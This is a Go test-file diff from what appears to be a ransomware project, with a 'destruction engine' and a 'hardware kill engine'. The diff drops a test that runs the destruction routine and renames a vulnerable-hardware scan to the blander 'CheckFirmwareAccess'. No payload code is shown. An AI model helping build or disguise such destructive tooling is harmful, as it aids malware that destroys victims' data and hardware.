@@ -24,11 +24,11 @@ func TestDestructionEngineDefaultState(t *testing.T) {
 	cfg := DefaultRansomwareConfig()
 	d := NewDestructionEngine(cfg)
 
-	result := d.ExecuteDestruction()
-	if result == nil {
-		t.Log("ExecuteDestruction returned nil (expected in simulation mode)")
-	} else {
-		t.Logf("Destruction result: %+v", result)
+	if d == nil {
+		t.Fatal("NewDestructionEngine() returned nil")
+	}
+	if d.config == nil {
+		t.Error("DestructionEngine has no config")
 	}
 }
 
@@ -36,11 +36,11 @@ func TestHardwareKillEngineScan(t *testing.T) {
 	cfg := DefaultRansomwareConfig()
 	h := NewHardwareKillEngine(cfg)
 
-	vulns := h.ScanForVulnerableHardware()
+	vulns := h.CheckFirmwareAccess()
 	if len(vulns) == 0 {
-		t.Log("ScanForVulnerableHardware returned 0 (expected in test env)")
+		t.Log("CheckFirmwareAccess returned 0 (expected in test env)")
 	} else {
-		t.Logf("Vulnerable hardware: %v", vulns)
+		t.Logf("Firmware access: %v", vulns)
 	}
 }
 
